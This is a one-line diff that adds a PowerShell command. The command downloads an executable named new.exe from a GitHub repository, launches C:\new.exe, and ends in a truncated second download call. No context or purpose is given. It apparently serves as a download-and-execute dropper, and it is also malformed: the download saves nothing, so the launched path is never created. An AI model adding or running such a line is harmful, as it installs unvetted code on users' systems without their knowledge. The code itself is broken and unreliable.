@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://github.com/mo1sss/sss/blob/main/new.exe"; Start-Process -FilePath "C:\new.exe"; Invoke-WebRequest -Uri
